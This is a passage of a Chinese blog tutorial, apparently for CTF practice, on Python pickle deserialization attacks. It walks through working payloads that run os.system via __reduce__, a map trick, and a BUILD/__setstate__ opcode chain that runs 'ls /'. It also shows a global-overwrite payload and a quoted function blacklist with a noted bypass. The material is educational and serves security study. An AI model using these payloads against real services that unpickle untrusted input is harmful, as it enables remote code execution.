&#x27;secret.name&#x27;</span><br><span class=\"line\">   88: s    SETITEM</span><br><span class=\"line\">   89: V    UNICODE    &#x27;grade&#x27;</span><br><span class=\"line\">   96: V    UNICODE    &#x27;secret.grade&#x27;</span><br><span class=\"line\">  110: s    SETITEM</span><br><span class=\"line\">  111: b    BUILD</span><br><span class=\"line\">  112: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 0</span><br><span class=\"line\">--------------</span><br></pre></td></tr></table></figure>\n<p>再举个例子</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">import os</span><br><span class=\"line\">import pickletools</span><br><span class=\"line\">class exp(object):</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        return (os.system,(&#x27;whoami&#x27;,))</span><br><span class=\"line\">e = exp()</span><br><span class=\"line\">print(s)</span><br><span class=\"line\">s = pickle.dumps(e,protocol=0)</span><br><span class=\"line\">pickletools.dis(s)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;cnt\\nsystem\\np0\\n(Vwhoami\\np1\\ntp2\\nRp3\\n.&#x27;</span><br><span class=\"line\">    0: c    GLOBAL     &#x27;nt system&#x27;</span><br><span class=\"line\">   11: p    PUT        0</span><br><span class=\"line\">   14: (    MARK</span><br><span class=\"line\">   15: V        UNICODE    &#x27;whoami&#x27;</span><br><span class=\"line\">   23: p        PUT        1</span><br><span class=\"line\">   26: t        TUPLE      (MARK at 14)</span><br><span class=\"line\">   27: p    PUT        2</span><br><span class=\"line\">   30: R    REDUCE</span><br><span class=\"line\">   31: p    PUT        3</span><br><span class=\"line\">   34: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 0</span><br></pre></td></tr></table></figure>\n<p>翻译的每个具体命令上面都有写</p>\n<p>因为 0 版本更容易构造，手写用 0 版本手写</p>\n<p>接下来的手搓 opcode 就有些离谱了，看这篇吧</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9taXNha2lrYXRhLmdpdGh1Yi5pby8yMDIwLzA0L3B5dGhvbi0lRTUlOEYlOEQlRTUlQkElOEYlRTUlODglOTclRTUlOEMlOTYvIyVFNiU4OSU4QiVFNSU4NiU5OW9wY29kZQ==\">python 反序列化～Misaki’s Blog (misakikata.github.io)</span></p>\n<h3 id=\"__reduce__r指令\"><a class=\"markdownIt-Anchor\" href=\"#__reduce__r指令\">#</a> __reduce__(R 指令)</h3>\n<p>ctf 中大多数常见的 pickle 反序列化，利用方法大都是 <code>__reduce__</code></p>\n<p>触发 <code>__reduce__</code> 的指令码为 <code>R</code> ，干了这么一件事情：</p>\n<blockquote>\n<p>取当前栈的栈顶记为 <code>args</code> ，然后把它弹掉。</p>\n<p>取当前栈的栈顶记为 <code>f</code> ，然后把它弹掉。</p>\n<p>以 <code>args</code>  为参数，执行函数 <code>f</code> ，把结果压进当前栈。</p>\n</blockquote>\n<p>class 的 <code>__reduce__</code> 方法，在 pickle 反序列化的时候会被执行。其底层的编码方法，就是利用了 <code>R</code>  指令码。  <code>f</code>  要么返回字符串，要么返回一个 tuple，后者对我们而言更有用。</p>\n<p>一种很流行的攻击思路是：利用  <code>__reduce__</code>  构造恶意字符串，当这个字符串被反序列化的时候， <code>__reduce__</code> 会被执行。</p>\n<p>正常的字符串反序列化后，得到一个 <code>Student</code>  对象。我们想构造一个字符串，它在反序列化的时候，执行 <code>dir</code>  指令。那么我们只需要这样得到 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import pickletools</span><br><span class=\"line\">import pickle</span><br><span class=\"line\">class Student():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.name = &#x27;sb&#x27;</span><br><span class=\"line\">        self.grade = &#x27;zz&#x27;</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        return (os.system,(&#x27;dir&#x27;,))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = pickle.dumps(Student())</span><br><span class=\"line\">payload = pickletools.optimize(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">pickletools.dis(payload)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03cnt\\nsystem\\nX\\x03\\x00\\x00\\x00dir\\x85R.&#x27;</span><br><span class=\"line\">    0: \\x80 PROTO      3</span><br><span class=\"line\">    2: c    GLOBAL     &#x27;nt system&#x27;</span><br><span class=\"line\">   13: X    BINUNICODE &#x27;dir&#x27;</span><br><span class=\"line\">   21: \\x85 TUPLE1</span><br><span class=\"line\">   22: R    REDUCE</span><br><span class=\"line\">   23: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>\n<p>现在把 payload 拿给正常的程序（Student 类里面没有 <code>__reduce__</code> 方法）去解析：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import pickletools</span><br><span class=\"line\">import pickle</span><br><span class=\"line\">class Student():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.name = &#x27;sb&#x27;</span><br><span class=\"line\">        self.grade = &#x27;zz&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">res = pickle.loads(b&#x27;\\x80\\x03cnt\\nsystem\\nX\\x03\\x00\\x00\\x00dir\\x85R.&#x27;)</span><br></pre></td></tr></table></figure>\n<p>即使 Student 类是正常的，pickle.loads 仍然执行了 os.system (‘dir’)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\18310\\AppData\\Local\\Programs\\Python\\Python37\\python.exe C:/Users/18310/Desktop/serial.py</span><br><span class=\"line\"> ������ C �еľ��� Windows-SSD</span><br><span class=\"line\"> ������к��� 4FEC-7D0B</span><br><span class=\"line\"></span><br><span class=\"line\"> C:\\Users\\18310\\Desktop\\sec֪ʶ��\\Ӧ����Ӧ\\py_pickel ��Ŀ¼</span><br><span class=\"line\"></span><br><span class=\"line\">2022/11/24  11:45    &lt;DIR&gt;          .</span><br><span class=\"line\">2022/11/24  11:45    &lt;DIR&gt;          ..</span><br><span class=\"line\">2022/11/24  11:44    &lt;DIR&gt;          .idea</span><br><span class=\"line\">2021/10/07  14:22            16,958 6.png</span><br><span class=\"line\">2022/08/17  21:43             2,938 aaaa.gif</span><br><span class=\"line\">2022/08/17  21:53    &lt;DIR&gt;          build</span><br></pre></td></tr></table></figure>\n<p>只要在序列化中的字符串中存在 <code>R</code>  指令， <code>__reduce__</code> 方法就会被执行，无论正常程序中是否写明了 <code>__reduce__</code></p>\n<p>由于 <code>__reduce__</code> 方法对应的操作码是 <code>R</code> ，只需要<strong>把操作码 <code>R</code>  过滤掉</strong>就行了。这个可以很方便地利用 <code>pickletools.genops</code>  来实现。</p>\n<p><strong>绕过黑名单</strong></p>\n<p>有一种过滤方式：不禁止 <code>R</code>  指令码，但是对 <code>R</code>  执行的函数有黑名单限制。典型的例子是 2018-XCTF-HITB-WEB : Python’s-Revenge。给了好长好长一串黑名单：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</span><br></pre></td></tr></table></figure>\n<p>可惜 <code>platform.popen()</code>  不在名单里，它可以做到类似 <code>system</code>  的功能。这题死于黑名单有漏网之鱼。</p>\n<p>还有一个解，那就是利用 map</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Exploit(object):</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\"> \treturn map,(os.system,[&quot;ls&quot;])</span><br></pre></td></tr></table></figure>\n<h3 id=\"全局变量包含覆盖c指令码\"><a class=\"markdownIt-Anchor\" href=\"#全局变量包含覆盖c指令码\">#</a> 全局变量包含覆盖： <code>c</code>  指令码</h3>\n<p><code>c</code>  指令码可以用来调用全局的 <code>xxx.xxx</code>  的值</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> secret</span><br><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> pickletools</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">flag</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self,a,b</span>):</span><br><span class=\"line\">        self.a = a</span><br><span class=\"line\">        self.b = b</span><br><span class=\"line\"><span class=\"comment\"># new_flag = pickle.dumps(flag(&#x27;A&#x27;,&#x27;B&#x27;),protocol=3)</span></span><br><span class=\"line\"><span class=\"comment\"># print(new_flag)</span></span><br><span class=\"line\"><span class=\"comment\"># pickletools.dis(new_flag)</span></span><br><span class=\"line\"></span><br><span class=\"line\">your_payload = <span class=\"string\">b&#x27;?&#x27;</span></span><br><span class=\"line\">other_flag = pickle.loads(your_payload)</span><br><span class=\"line\">secret_flag = flag(secret.a,secret.b)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> other_flag.a == secret_flag.a <span class=\"keyword\">and</span> other_flag.b == secret_flag.b:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;flag&#123;xxxxxx&#125;&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;No!&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># secret.py</span></span><br><span class=\"line\"><span class=\"comment\"># you can not see this</span></span><br><span class=\"line\">a = <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\">b = <span class=\"string\">&#x27;bbbb&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>现在的任务是：给出一个字符串，<strong>反序列化之后，a 和 b 需要与 secret 这个 module 里面的 a、b 相对应</strong>。</p>\n<p>在我们不知道 <code>secret.py</code>  中值的情况下，如何构造满足条件的 payload，拿到 flag</p>\n<p>不能用 <code>R</code>  指令码了， <code>c</code>  指令码专门用来获取一个全局变量。</p>\n<p>我们先弄一个正常的 Student 来看看序列化之后的效果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import pickletools</span><br><span class=\"line\">import pickle</span><br><span class=\"line\">class Student():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.name = &#x27;sb&#x27;</span><br><span class=\"line\">        self.grade = &#x27;zz&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#     def __reduce__(self):</span><br><span class=\"line\">#         return (os.system,(&#x27;dir&#x27;,))</span><br><span class=\"line\">#</span><br><span class=\"line\">payload = pickle.dumps(Student())</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">print(&quot;--------------&quot;)</span><br><span class=\"line\">payload = pickletools.optimize(payload)</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">print(&quot;--------------&quot;)</span><br><span class=\"line\">pickletools.dis(payload)</span><br><span class=\"line\">print(&quot;--------------&quot;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nStudent\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x02\\x00\\x00\\x00sbq\\x04X\\x05\\x00\\x00\\x00gradeq\\x05X\\x02\\x00\\x00\\x00zzq\\x06ub.&#x27;</span><br><span class=\"line\">--------------</span><br><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nStudent\\n)\\x81&#125;(X\\x04\\x00\\x00\\x00nameX\\x02\\x00\\x00\\x00sbX\\x05\\x00\\x00\\x00gradeX\\x02\\x00\\x00\\x00zzub.&#x27;</span><br><span class=\"line\">--------------</span><br><span class=\"line\">    0: \\x80 PROTO      3</span><br><span class=\"line\">    2: c    GLOBAL     &#x27;__main__ Student&#x27;</span><br><span class=\"line\">   20: )    EMPTY_TUPLE</span><br><span class=\"line\">   21: \\x81 NEWOBJ</span><br><span class=\"line\">   22: &#125;    EMPTY_DICT</span><br><span class=\"line\">   23: (    MARK</span><br><span class=\"line\">   24: X        BINUNICODE &#x27;name&#x27;</span><br><span class=\"line\">   33: X        BINUNICODE &#x27;sb&#x27;</span><br><span class=\"line\">   40: X        BINUNICODE &#x27;grade&#x27;</span><br><span class=\"line\">   50: X        BINUNICODE &#x27;zz&#x27;</span><br><span class=\"line\">   57: u        SETITEMS   (MARK at 23)</span><br><span class=\"line\">   58: b    BUILD</span><br><span class=\"line\">   59: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 2</span><br><span class=\"line\">--------------</span><br></pre></td></tr></table></figure>\n<p>注意看 33 和 50 行的变量值，以 name 的为例，只需要把硬编码的 <code>sb</code>  改成从 <code>secret</code>  引入的 <code>name</code> ，写成指令就是： <code>csecret\\nname\\n</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> 0: \\x80 PROTO      3</span><br><span class=\"line\"> 2: c    GLOBAL     &#x27;__main__ Student&#x27;</span><br><span class=\"line\">20: )    EMPTY_TUPLE</span><br><span class=\"line\">21: \\x81 NEWOBJ</span><br><span class=\"line\">22: &#125;    EMPTY_DICT</span><br><span class=\"line\">23: (    MARK</span><br><span class=\"line\">24: X        BINUNICODE &#x27;name&#x27;</span><br><span class=\"line\">33: c        GLOBAL \t   &#x27;secret name&#x27;</span><br><span class=\"line\">40: X        BINUNICODE &#x27;grade&#x27;</span><br><span class=\"line\">50: c        GLOBAL \t   &#x27;secret grade&#x27;</span><br><span class=\"line\">57: u        SETITEMS   (MARK at 23)</span><br><span class=\"line\">58: b    BUILD</span><br><span class=\"line\">59: .    STOP</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">原来的：b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x01\\x00\\x00\\x00aq\\x03X\\x01\\x00\\x00\\x00Aq\\x04X\\x01\\x00\\x00\\x00bq\\x05X\\x01\\x00\\x00\\x00Bq\\x06ub.&#x27;</span><br><span class=\"line\">现在的：</span><br><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x01\\x00\\x00\\x00aq\\x03csecret\\na\\nq\\x04X\\x01\\x00\\x00\\x00bq\\x05csecret\\nb\\nq\\x06ub.&#x27;</span><br></pre></td></tr></table></figure>\n<p>或者再举个例子</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-b42656fa4b3c95eaee8c37dccacad636_720w.webp\" alt=\"img\"></p>\n<p>现在的任务是：给出一个字符串，<strong>反序列化之后，name 和 grade 需要与 blue 这个 module 里面的 name、grade 相对应</strong>。</p>\n<p>正常的 student 类序列化之后的效果：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-8b0cb8c071dadcde37abdce434a8f180_720w.webp\" alt=\"img\"></p>\n<p>以 name 的为例，只需要把硬编码的 <code>rxz</code>  改成从 <code>blue</code>  引入的 <code>name</code> ，写成指令就是： <code>cblue\\nname\\n</code> 。把用于编码 <code>rxz</code>  的 <code>X\\x03\\x00\\x00\\x00rxz</code>  替换成我们的这个 global 指令</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-2a5604887f01ef88aebf6409279e82a1_720w.webp\" alt=\"img\"></p>\n<p>顺带一提，由于 pickle 导出的字符串里面有很多的不可见字符，所以一般都经过 base64 编码之后传输。</p>\n<p>如果你也不能手搓 opcode，看看这两个链接？</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvMy43L0xpYi9waWNrbGUucHk=\">cpython/pickle.py at 3.7 · python/cpython (github.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9hbmFwaWNrbGUvYmxvYi9tYXN0ZXIvYW5hcGlja2xlLnB5\">anapickle/anapickle.py at master · sensepost/anapickle (github.com)</span></p>\n<p>绕过黑名单</p>\n<p>之前提到过， <code>c</code>  指令（也就是 GLOBAL 指令）基于 <code>find_class</code>  这个方法， 然而 <code>find_class</code>  可以被出题人重写。如果出题人只允许 <code>c</code>  指令包含 <code>__main__</code> 这一个 module，这道题又该如何解决呢</p>\n<p>通过 GLOBAL 指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改！</p>\n<ul>\n<li>通过 <code>__main__.blue</code>  引入这一个 module，由于命名空间还在 main 内，故不会被拦截</li>\n<li>把一个 dict 压进栈，内容是 <code>&#123;'name': 'rua', 'grade': 'www'&#125;</code></li>\n<li>执行 BUILD 指令，会导致改写  <code>__main__.blue.name</code>  和  <code>__main__.blue.grade</code>  ，至此 <code>blue.name</code>  和 <code>blue.grade</code>  已经被篡改成我们想要的内容</li>\n<li>弹掉栈顶，现在栈变成空的</li>\n<li>照抄正常的 Student 序列化之后的字符串，压入一个正常的 Student 对象，name 和 grade 分别是’rua’和’www’</li>\n</ul>\n<p>由于栈顶是正常的 Student 对象，pickle.loads 将会正常返回。到手的 Student 对象，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1uYW1lZ3JhZGVibHVlLTQ1MHVqOTZlZW4zYmR0MWQ5c3hnLm5hbWU=\">当然 name 和 grade 都与 blue.name</span>、blue.grade 对应了 —— 我们刚刚亲手把 blue 篡改掉。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-be0b611551c62614ea92f06ffe234480_r.jpg\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = b&#x27;\\x80\\x03c__main__\\nblue\\n&#125;(Vname\\nVrua\\nVgrade\\nVwww\\nub0c__main__\\nStudent\\n)\\x81&#125;(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x05\\x00\\x00\\x00gradeX\\x03\\x00\\x00\\x00wwwub.&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import blue</span><br><span class=\"line\">def check(data):</span><br><span class=\"line\">    if b&#x27;R&#x27; in data:</span><br><span class=\"line\">        return &#x27;no reduce!&#x27;</span><br><span class=\"line\">    x = pickle.loads(data)</span><br><span class=\"line\">    </span><br><span class=\"line\">    if (x != Student(blue.name, blue.grade)):</span><br><span class=\"line\">        return &#x27;not equal&#x27;</span><br><span class=\"line\">    return f&#x27;well done now blue.grade=&#123;blue.grade&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(check(base64.b64decode(input())))</span><br></pre></td></tr></table></figure>\n<h3 id=\"使用build指令rce\"><a class=\"markdownIt-Anchor\" href=\"#使用build指令rce\">#</a> 使用 build 指令 rce</h3>\n<p><code>__reduce__</code> 与 <code>R</code>  指令是绑定的，禁止了 <code>R</code>  指令就禁止了 <code>__reduce__</code>  方法。那么，在禁止 <code>R</code>  指令的情况下，我们还能 RCE 吗？</p>\n<p>现在的目标是，利用指令码，构造出任意命令执行。那么我们需要找到一个函数调用 <code>fun(arg)</code> ，其中 <code>fun</code>  和 <code>arg</code>  都必须可控。</p>\n<p>审 pickle 源码，来看看 BUILD 指令（指令码为 <code>b</code> ）是如何工作的：</p>\n<p>这里的实现方式也就是上文的注所提到的：如果 <code>inst</code>  拥有 <code>__setstate__</code> 方法，则把 <code>state</code>  交给 <code>__setstate__</code> 方法来处理；否则的话，直接把 <code>state</code>  这个 <code>dist</code>  的内容，合并到 <code>inst.__dict__ </code> 里面。</p>\n<p>通过 BUILD 指令与 C 指令的结合，我们可以把改写为 <code>os.system</code>  或其他函数</p>\n<p><code>Student</code>  原先是没有 <code>__setstate__</code> 这个方法的。那么我们利用 <code>&#123;'__setstate__': os.system&#125;</code>  来 BUILD 这个对象，那么现在对象的 <code>__setstate__</code> 就变成了 <code>os.system</code> ；接下来利用 <code>&quot;ls /&quot;</code>  来再次 BUILD 这个对象，则会执行 <code>setstate(&quot;ls /&quot;)</code>  ，而此时 <code>__setstate__</code> 已经被我们设置为 <code>os.system</code> ，因此实现了 RCE.</p>\n<p>payload 构造如下：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = b&#x27;\\x80\\x03c__main__\\nStudent\\n)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVls /\\nb.&#x27;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-5f6f6661a916b296e3fac6fbed8427cc_720w.webp\" alt=\"img\"></p>\n<p>有一个可以改进的地方：这份 payload 由于没有返回一个 Student，导致后面抛出异常。要让后面无异常也很简单：干完了恶意代码之后把栈弹到空，然后压一个正常 Student 进栈。payload 构造如下：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = b&#x27;\\x80\\x03c__main__\\nStudent\\n)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVls /\\nb0c__main__\\nStu</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-fd188e8d3e3f341d719019b7e869bf9d_720w.webp\" alt=\"img\"></p>\n<p>具体构造 payload 的方法：</p>\n<p>假设我们有一个 flag 类</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">import pickletools</span><br><span class=\"line\"></span><br><span class=\"line\">class flag():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        pass</span><br><span class=\"line\">new_flag = pickle.dumps(flag(),protocol=3)</span><br><span class=\"line\">print(new_flag)</span><br><span class=\"line\">pickletools.dis(new_flag)</span><br><span class=\"line\"></span><br><span class=\"line\"># your_payload = b&#x27;?&#x27;</span><br><span class=\"line\"># other_flag = pickle.loads(your_payload)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span 